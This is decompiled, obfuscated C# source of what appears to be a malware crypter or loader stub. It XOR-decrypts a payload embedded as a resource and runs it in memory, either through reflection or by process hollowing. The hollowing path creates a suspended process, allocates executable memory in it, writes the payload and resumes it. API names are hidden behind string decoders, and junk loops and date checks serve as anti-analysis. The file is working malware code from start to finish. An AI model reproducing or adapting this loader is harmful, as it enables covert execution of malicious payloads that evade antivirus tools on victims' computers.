using System;
using System.Drawing;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0;

[StandardModule]
internal sealed class Class5
{
	public delegate bool Delegate0(string string_0, string string_1, IntPtr intptr_0, IntPtr intptr_1, bool bool_0, int int_0, IntPtr intptr_2, string string_2, byte[] byte_0, IntPtr[] intptr_3);

	public delegate bool Delegate1(IntPtr intptr_0, uint[] uint_0);

	public delegate bool Delegate2(IntPtr intptr_0, IntPtr intptr_1, ref IntPtr intptr_2, IntPtr intptr_3, ref IntPtr intptr_4);

	public delegate uint Delegate3(IntPtr intptr_0, IntPtr intptr_1);

	public delegate IntPtr Delegate4(IntPtr intptr_0, IntPtr intptr_1, IntPtr intptr_2, int int_0, int int_1);

	public delegate bool Delegate5(IntPtr intptr_0, IntPtr intptr_1, byte[] byte_0, IntPtr intptr_2, ref IntPtr intptr_3);

	public delegate int Delegate6(IntPtr intptr_0);

	private static int int_0;

	private static ushort ushort_0;

	private static sbyte sbyte_0;

	private static decimal decimal_0;

	private static double double_0;

	private static byte byte_0;

	private static double double_1;

	private static double double_2;

	static Class5()
	{
		Class36.Class37.smethod_15();
		Class31.Class32.smethod_12();
		Class26.smethod_15();
		Class0.smethod_6();
		int_0 = 695394633;
		ushort_0 = 13015;
		sbyte_0 = -50;
		decimal_0 = default(decimal);
		double_0 = -29974.0;
		byte_0 = 0;
		double_1 = 31055.8622;
		double_2 = 15897.27;
	}

	public static byte[] smethod_0(byte[] byte_1)
	{
		byte[] array = new byte[13]
		{
			107, 104, 82, 224, 186, 220, 130, 34, 115, 131,
			109, 113, 215
		};
		int num = array.Length;
		int num2 = checked(byte_1.Length - 1);
		for (int i = 0; i <= num2; i = checked(i + 1))
		{
			byte_1[i] = (byte)(byte_1[i] ^ array[i % num]);
		}
		return byte_1;
	}

	public static string smethod_1(string string_0, ushort ushort_1)
	{
		double num = 18.0;
		do
		{
			num += 1.0;
		}
		while (num <= 81.0);
		ulong num2 = 19uL;
		do
		{
			decimal num3 = new decimal(14L);
			decimal num4 = new decimal(124L);
			decimal num5 = num3;
			while (ForLoopControl.ForNextCheckDec(num5, num4, 1m))
			{
				num5 = Class10.smethod_2(num5, 1m, 372, 352);
			}
			num2 = checked(num2 + 1uL);
		}
		while (num2 <= 119L);
		return Class26.Class28.smethod_2(Class16.smethod_3(137, 190), smethod_0(Class0.smethod_2(string_0, 115, 118)), 237, 241);
	}

	public static int smethod_2(sbyte sbyte_1, int int_1, byte[] byte_1, decimal decimal_1)
	{
		bool flag = true;
		short num = 14;
		checked
		{
			do
			{
				double num2 = 11.0;
				do
				{
					num2 += 1.0;
				}
				while (num2 <= 46.0);
				num = (short)unchecked(num + 1);
			}
			while (num <= 63);
			string string_ = Class6.smethod_0(Class8.smethod_0(Class10.smethod_0(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0(Class18.smethod_0(Class20.smethod_0(Class22.smethod_0(Class24.smethod_0(Class0.smethod_1(1216787708, 8), 61595), 59530), 59743), 58786), 61792), 59513), 60963), 63201), 63146), 58598);
			int i = 0;
			for (int num3 = Class22.smethod_2(string_, 680, 760); i < num3; i++)
			{
				Class20.smethod_2(string_, i, 332, 286);
			}
			if (!flag)
			{
			}
			Color color_ = Class12.smethod_2(byte_1[int_1 + 3], byte_1[int_1 + 2], byte_1[int_1 + 1], byte_1[int_1], 380, 360);
			return Class26.smethod_6(ref color_, 993, 1005);
		}
	}

	public static byte[] smethod_3(int int_1, DateTime dateTime_0, double double_3, DateTime dateTime_1)
	{
		long num = 2L;
		checked
		{
			do
			{
				sbyte b = 4;
				do
				{
					b = (sbyte)unchecked(b + 1);
				}
				while (b <= sbyte.MaxValue);
				sbyte b2 = 20;
				do
				{
					decimal num2 = new decimal(36L);
					decimal num3 = 0m;
					while (ForLoopControl.ForNextCheckDec(num3, num2, 1m))
					{
						num3 = Class10.smethod_2(num3, 1m, 783, 795);
					}
					b2 = (sbyte)unchecked(b2 + 1);
				}
				while (b2 <= 100);
				num++;
			}
			while (num <= 53L);
			long num4 = 16L;
			do
			{
				num4++;
			}
			while (num4 <= 96L);
			Color color_ = Class6.smethod_2(int_1, 521, 617);
			return new byte[4]
			{
				BabelAttribute.smethod_1(ref color_, 301, 286),
				BabelAttribute.smethod_1(ref color_, 886, 834),
				BabelAttribute.smethod_1(ref color_, 235, 222),
				Class30.smethod_3(ref color_, 793, 779)
			};
		}
	}

	[DllImport("kernel32")]
	public static extern IntPtr LoadLibrary(string string_0);

	[DllImport("kernel32")]
	public static extern IntPtr GetProcAddress(IntPtr intptr_0, string string_0);

	public static T smethod_4<T>(long long_0, string string_0, long long_1)
	{
		return Conversions.ToGenericParameter<T>((object)Class26.Class29.smethod_16(GetProcAddress(LoadLibrary(Class12.smethod_3(string_0, new char[1] { Class18.smethod_3(58, 589, 543) }, 405, 498)[0]), Class12.smethod_3(string_0, new char[1] { Class18.smethod_3(58, 995, 945) }, 975, 936)[1]), Class26.smethod_9(typeof(T).TypeHandle, 1012, 1016), 281, 308));
	}

	public static void smethod_5(object object_0)
	{
		byte b = 9;
		do
		{
			checked
			{
				b = (byte)unchecked((uint)(b + 1));
			}
		}
		while ((uint)b <= 20u);
		MethodInfo methodBase_ = Class14.smethod_4(Class8.smethod_5((byte[])object_0, 487, 424), 479, 480);
		if (Class6.smethod_3(methodBase_, 520, 567).Length == 0)
		{
			Class22.smethod_6(methodBase_, null, null, 218, 148);
			return;
		}
		Class30.smethod_12(methodBase_, null, new object[1] { new string[0] }, 1006, 961);
	}

	public static void smethod_6(byte[] byte_1, long long_0, int int_1)
	{
		int num = 0;
		checked
		{
			do
			{
				num++;
			}
			while (num <= 100);
			if (byte_1[60] == 128)
			{
				Thread thread_ = new Thread(smethod_5);
				Class6.smethod_4(thread_, ApartmentState.STA, 228, 210);
				byte b = 0;
				do
				{
					for (int i = b; i <= 30 && i != 25; i++)
					{
					}
					b = (byte)unchecked((uint)(b + 1));
				}
				while (unchecked((uint)b) <= 20u);
				Class20.smethod_6(thread_, byte_1, 765, 698);
				return;
			}
			string string_ = Class8.smethod_6(Class18.smethod_2(442, 461), 185, 132);
			if (Class22.smethod_7(Class20.smethod_5(Class8.smethod_7(Class20.smethod_2(Class10.smethod_4(62, 113), 0, 5, 87), 356, 359), smethod_1(Class6.smethod_0(Class8.smethod_0(Class10.smethod_0(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0(Class18.smethod_0(Class20.smethod_0(Class22.smethod_0(Class24.smethod_0(Class0.smethod_1(1216787680, 8), 61784), 59706), 62118), 58741), 59202), 61110), 59950), 61847), 57506), 60326), 16814), 453, 395), 151, 192))
			{
				string[] array = Class18.smethod_4(Class20.smethod_5(Class8.smethod_7(Class20.smethod_2(Class10.smethod_4(856, 791), 0, 816, 866), 135, 132), smethod_1(Class6.smethod_0(Class8.smethod_0(Class10.smethod_0(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0(Class18.smethod_0(Class20.smethod_0(Class22.smethod_0(Class24.smethod_0(Class0.smethod_1(1216787592, 1), 61429), 58606), 60275), 58088), 62419), 57928), 63612), 59558), 59680), 57888), 0), 105, 39), 857, 844);
				foreach (string string_2 in array)
				{
					if (!Class16.smethod_4(Class24.smethod_4(string_2, 954, 953), smethod_1(Class6.smethod_0(Class8.smethod_0(Class10.smethod_0(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0(Class18.smethod_0(Class20.smethod_0(Class22.smethod_0(Class24.smethod_0(Class0.smethod_1(1216787544, 2), 63396), 61602), 59791), 63275), 62601), 62619), 59549), 58048), 57635), 61187), 23893), 479, 396))
					{
						string string_3 = Class6.smethod_0(Class8.smethod_0(Class10.smethod_0(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0(Class18.smethod_0(Class20.smethod_0(Class22.smethod_0(Class24.smethod_0(Class0.smethod_1(1216787577, 5), 63366), 57568), 62979), 61556), 59527), 61115), 62266), 59037), 62218), 61332);
						int k = 0;
						for (int num2 = Class22.smethod_2(string_3, 407, 455); k < num2; k++)
						{
							Class20.smethod_2(string_3, k, 192, 146);
						}
						continue;
					}
					string_ = Class20.smethod_5(string_2, smethod_1(Class6.smethod_0(Class8.smethod_0(Class10.smethod_0(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0(Class18.smethod_0(Class20.smethod_0(Class22.smethod_0(Class24.smethod_0(Class0.smethod_1(1216787531, 4), 60784), 58919), 57842), 62010), 62660), 61871), 62398), 57907), 61713), 58520), 19117), 683, 741);
					break;
				}
			}
			byte[] array2 = new byte[6] { 0, 1, 2, 3, 4, 5 };
			int[] array3 = new int[8] { 1, 16, 2, 32, 4, 64, 4, 64 };
			int num3 = smethod_2(-70, 60, byte_1, new decimal(1137713943L));
			int num4 = Class18.smethod_5(byte_1, num3 + 6, 535, 611);
			short num5 = 16;
			do
			{
				num5 = (short)unchecked(num5 + 1);
			}
			while (num5 <= 51);
			IntPtr intptr_ = new IntPtr(smethod_2(84, num3 + 84, byte_1, new decimal(1769716815L)));
			IntPtr[] array4 = new IntPtr[4];
			IntPtr intPtr = default(IntPtr);
			if (!smethod_4<Delegate0>(0L, smethod_1(Class6.smethod_0(Class8.smethod_0(Class10.smethod_0(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0(Class18.smethod_0(Class20.smethod_0(Class22.smethod_0(Class24.smethod_0(Class0.smethod_1(1216787566, 0), 62077), 60706), 57668), 61839), 62005), 63673), 62227), 62662), 58575), 59343), 14479), 1819660778L)(null, string_, intPtr, intPtr, bool_0: false, 4, intPtr, null, new byte[0], array4))
			{
				return;
			}
			try
			{
				uint[] array5 = new uint[179];
				array5[0] = 65538u;
				float num6 = 13f;
				do
				{
					num6 += 1f;
				}
				while (num6 <= 47f);
				if (smethod_4<Delegate1>(1098711242L, smethod_1(Class6.smethod_0(Class8.smethod_0(Class10.smethod_0(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0(Class18.smethod_0(Class20.smethod_0(Class22.smethod_0(Class24.smethod_0(Class0.smethod_1(1216787459, 8), 59821), 61726), 57487), 60581), 61809), 61554), 57980), 59652), 59104), 63232), 27771), -505714099L)(array4[1], array5))
				{
					Delegate2 @delegate = smethod_4<Delegate2>(0L, smethod_1(Class6.smethod_0(Class8.smethod_0(Class10.smethod_0(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0(Class18.smethod_0(Class20.smethod_0(Class22.smethod_0(Class24.smethod_0(Class0.smethod_1(1216787488, 4), 59892), 60903), 59285), 63326), 59990), 62618), 62383), 59149), 57973), 60866), 19620), 1538012852L);
					IntPtr intptr_2 = array4[0];
					IntPtr intptr_3 = new IntPtr(unchecked((long)array5[41]) + 8L);
					IntPtr intptr_4 = new IntPtr(4);
					IntPtr intptr_5 = default(IntPtr);
					IntPtr intptr_6 = default(IntPtr);
					if (@delegate(intptr_2, intptr_3, ref intptr_5, intptr_4, ref intptr_6) && unchecked((long)smethod_4<Delegate3>(-9920877L, smethod_1(Class6.smethod_0(Class8.smethod_0(Class10.smethod_0(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0(Class18.smethod_0(Class20.smethod_0(Class22.smethod_0(Class24.smethod_0(Class0.smethod_1(1216787967, 2), 61702), 61728), 60529), 60571), 60060), 61284), 59308), 63187), 59764), 62621), 0), 0L)(array4[0], intptr_5)) == 0L)
					{
						Delegate4 delegate2 = smethod_4<Delegate4>(-617028474L, smethod_1(Class6.smethod_0(Class8.smethod_0(Class10.smethod_0(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0(Class18.smethod_0(Class20.smethod_0(Class22.smethod_0(Class24.smethod_0(Class0.smethod_1(1216787856, 6), 58566), 58161), 61682), 61823), 60190), 62662), 63159), 60931), 61655), 62559), 4246), -397496837L);
						IntPtr intptr_7 = array4[0];
						IntPtr intPtr2 = new IntPtr(smethod_2(47, num3 + 52, byte_1, new decimal(836033914L)));
						IntPtr intptr_8 = intPtr2;
						IntPtr intptr_9 = new IntPtr(smethod_2(37, num3 + 80, byte_1, 0m));
						IntPtr intptr_10 = delegate2(intptr_7, intptr_8, intptr_9, 12288, 64);
						Delegate5 delegate3 = smethod_4<Delegate5>(-844886984L, smethod_1(Class6.smethod_0(Class8.smethod_0(Class10.smethod_0(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0(Class18.smethod_0(Class20.smethod_0(Class22.smethod_0(Class24.smethod_0(Class0.smethod_1(1216787894, 5), 60397), 63062), 59617), 58348), 57387), 63496), 57841), 59092), 61938), 61267), 9727), 303949402L);
						delegate3(array4[0], intptr_10, byte_1, intptr_, ref intptr_6);
						int[] array6 = new int[10];
						int num7 = num4 - 1;
						for (int l = 0; l <= num7; l++)
						{
							array6[0] = 13;
							array6[5] = 255 + array6[0];
							Class22.smethod_8(byte_1, num3 + 248 + l * 40, array6, 0, 40, 915, 951);
							byte[] array7 = new byte[array6[4] - 1 + 1];
							Class22.smethod_8(byte_1, array6[5], array7, 0, array7.Length, 532, 560);
							array6.Length.ToString();
							IntPtr intptr_11 = array4[0];
							intptr_9 = new IntPtr(Class0.smethod_4(ref intptr_10, 720, 729) + array6[3]);
							IntPtr intptr_12 = intptr_9;
							intPtr2 = new IntPtr(array7.Length);
							delegate3(intptr_11, intptr_12, array7, intPtr2, ref intptr_6);
						}
						IntPtr intptr_13 = array4[0];
						intptr_9 = new IntPtr(unchecked((long)array5[41]) + 8L);
						IntPtr intptr_14 = intptr_9;
						byte[] array8 = smethod_3(Class0.smethod_4(ref intptr_10, 462, 455), Class16.smethod_2(229, 224), 0.0, Class16.smethod_2(237, 232));
						intPtr2 = new IntPtr(4);
						delegate3(intptr_13, intptr_14, array8, intPtr2, ref intptr_6);
						array5[44] = (uint)(Class0.smethod_4(ref intptr_10, 802, 811) + smethod_2(36, num3 + 40, byte_1, new decimal(-178964734L)));
						smethod_4<Delegate1>(2102504787L, smethod_1(Class6.smethod_0(Class8.smethod_0(Class10.smethod_0(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0(Class18.smethod_0(Class20.smethod_0(Class22.smethod_0(Class24.smethod_0(Class0.smethod_1(1216787789, 1), 62537), 57502), 60519), 59536), 57735), 62481), 59143), 58698), 61245), 63597), 0), 1652450910L)(array4[1], array5);
						smethod_4<Delegate6>(0L, smethod_1(Class6.smethod_0(Class8.smethod_0(Class10.smethod_0(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0(Class18.smethod_0(Class20.smethod_0(Class22.smethod_0(Class24.smethod_0(Class0.smethod_1(1216787810, 7), 62171), 63602), 59790), 60516), 57929), 63171), 59526), 61104), 60672), 63475), 13239), 847528111L)(array4[1]);
						return;
					}
				}
			}
			catch (Exception exception_)
			{
				Class26.Class28.smethod_9(exception_, 355, 298);
				Class26.Class29.smethod_12(760, 695);
			}
			Class26.Class28.smethod_10(Class30.smethod_13(Class26.Class29.smethod_13(ref array4[2], 721, 762), 137, 235), 495, 455);
		}
	}

	[STAThread]
	public static void Main()
	{
		Class36.Class37.smethod_15();
		Class31.Class32.smethod_12();
		Class26.smethod_15();
		Class0.smethod_6();
		if (Class8.smethod_2(Class16.smethod_2(357, 352), new DateTime(635063163241188603L), 100, 75))
		{
			throw new Exception();
		}
		if (Class8.smethod_2(Class16.smethod_2(993, 996), new DateTime(635063163191975788L), 317, 274))
		{
			throw new Exception();
		}
		if (Class8.smethod_2(Class16.smethod_2(142, 139), new DateTime(635063163144503073L), 145, 190))
		{
			throw new Exception();
		}
		if (Class8.smethod_2(Class16.smethod_2(793, 796), new DateTime(635063163075799143L), 1012, 987))
		{
			throw new Exception();
		}
		if (Class8.smethod_2(Class16.smethod_2(716, 713), new DateTime(635063163029776511L), 843, 868))
		{
			throw new Exception();
		}
		if (Class8.smethod_2(Class16.smethod_2(363, 366), new DateTime(635063162988054125L), 281, 310))
		{
			throw new Exception();
		}
		if (Class8.smethod_2(Class16.smethod_2(51, 54), new DateTime(635063162936271163L), 44, 3))
		{
			throw new Exception();
		}
		if (Class8.smethod_2(Class16.smethod_2(378, 383), new DateTime(635063162897518946L), 1006, 961))
		{
			throw new Exception();
		}
		if (Class8.smethod_2(Class16.smethod_2(213, 208), new DateTime(635063162840555688L), 463, 480))
		{
			throw new Exception();
		}
		if (Class8.smethod_2(Class16.smethod_2(585, 588), new DateTime(635063162489845629L), 355, 332))
		{
			throw new Exception();
		}
		int try020a_dispatch = -1;
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		sbyte b = default(sbyte);
		uint num5 = default(uint);
		ResourceManager resourceManager_ = default(ResourceManager);
		bool flag = default(bool);
		bool flag2 = default(bool);
		string string_ = default(string);
		int num6 = default(int);
		int num7 = default(int);
		bool flag3 = default(bool);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try020a_dispatch)
					{
					default:
						num = 1;
						Class6.smethod_0(Class8.smethod_0(Class10.smethod_0(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0(Class18.smethod_0(Class20.smethod_0(Class22.smethod_0(Class24.smethod_0(Class0.smethod_1(1216787718, 0), 61043), 63674), 59802), 62476), 60784), 60888), 58427), 60585), 62528), 61301);
						goto IL_027c;
					case 1223:
						{
							num2 = num;
							if (num3 > -2)
							{
								switch (num3)
								{
								default:
									goto end_IL_020a;
								case 1:
									break;
								case 0:
									goto end_IL_020a;
								}
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_027c;
							case 3:
								goto IL_0289;
							case 4:
								goto IL_028b;
							case 5:
								goto IL_0292;
							case 6:
								goto IL_029d;
							case 7:
								goto IL_0324;
							case 8:
								goto IL_03cd;
							case 9:
								goto IL_03d1;
							case 10:
								goto IL_03da;
							case 11:
								goto IL_03dd;
							case 12:
								goto IL_03e3;
							case 13:
							case 14:
								goto IL_03ea;
							case 15:
								goto IL_0490;
							case 16:
								goto IL_0499;
							case 17:
								goto IL_049e;
							case 18:
							case 19:
							case 20:
								goto IL_04a4;
							case 21:
								goto end_IL_020a_2;
							default:
								goto end_IL_020a;
							case 0:
								goto end_IL_020a;
							case 22:
							case 23:
								goto end_IL_020a_3;
							}
							goto default;
						}
						IL_0490:
						num = 15;
						goto IL_0493;
						IL_04a4:
						num = 20;
						b = 4;
						break;
						IL_027c:
						Class18.smethod_6(97, 107);
						num3 = -2;
						goto IL_0289;
						IL_0289:
						num = 3;
						goto IL_028b;
						IL_028b:
						num = 4;
						num5 = 4u;
						goto IL_0292;
						IL_0292:
						do
						{
							num = 5;
							num5++;
						}
						while (num5 <= 75);
						goto IL_029d;
						IL_029d:
						num = 6;
						resourceManager_ = new ResourceManager(Class6.smethod_0(Class8.smethod_0(Class10.smethod_0(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0(Class18.smethod_0(Class20.smethod_0(Class22.smethod_0(Class24.smethod_0(Class0.smethod_1(1216787775, 2), 59204), 59031), 60087), 59006), 60939), 59711), 63693), 58626), 59727), 58527), Class18.smethod_2(790, 867));
						goto IL_0324;
						IL_0324:
						num = 7;
						smethod_6(smethod_0((byte[])Class0.smethod_5(resourceManager_, smethod_1(Class6.smethod_0(Class8.smethod_0(Class10.smethod_0(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0(Class18.smethod_0(Class20.smethod_0(Class22.smethod_0(Class24.smethod_0(Class0.smethod_1(1216787761, 3), 59819), 62933), 61867), 62129), 61904), 59686), 59674), 58743), 58079), 63097), 8517), 327, 268)), 518818372L, 1217831854);
						goto IL_03cd;
						IL_03cd:
						num = 8;
						flag = true;
						goto IL_03d1;
						IL_03d1:
						num = 9;
						if (!flag)
						{
							goto end_IL_020a_3;
						}
						goto IL_03da;
						IL_03da:
						num = 10;
						goto IL_03dd;
						IL_03dd:
						num = 11;
						flag2 = false;
						goto IL_03e3;
						IL_03e3:
						num = 12;
						if (flag2)
						{
						}
						goto IL_03ea;
						IL_03ea:
						num = 14;
						string_ = Class6.smethod_0(Class8.smethod_0(Class10.smethod_0(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0(Class18.smethod_0(Class20.smethod_0(Class22.smethod_0(Class24.smethod_0(Class0.smethod_1(1216787748, 7), 57615), 59351), 61940), 62361), 59624), 58771), 57410), 62340), 62058), 61513);
						num6 = 0;
						num7 = Class22.smethod_2(string_, 495, 447);
						goto IL_0493;
						IL_0493:
						if (num6 < num7)
						{
							Class20.smethod_2(string_, num6, 414, 460);
							num6++;
							goto IL_0490;
						}
						goto IL_0499;
						IL_0499:
						num = 16;
						flag3 = true;
						goto IL_049e;
						IL_049e:
						num = 17;
						if (flag3)
						{
						}
						goto IL_04a4;
						end_IL_020a_2:
						break;
					}
					do
					{
						num = 21;
						b = (sbyte)unchecked(b + 1);
					}
					while (b <= 29);
					break;
				}
				end_IL_020a:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				Class26.Class28.smethod_9((Exception)obj, 414, 471);
				try020a_dispatch = 1223;
				continue;
			}
			throw Class26.smethod_14(-2146828237, 756, 655);
			continue;
			end_IL_020a_3:
			break;
		}
		if (num2 != 0)
		{
			Class31.Class32.smethod_2(59, 120);
		}
	}
}
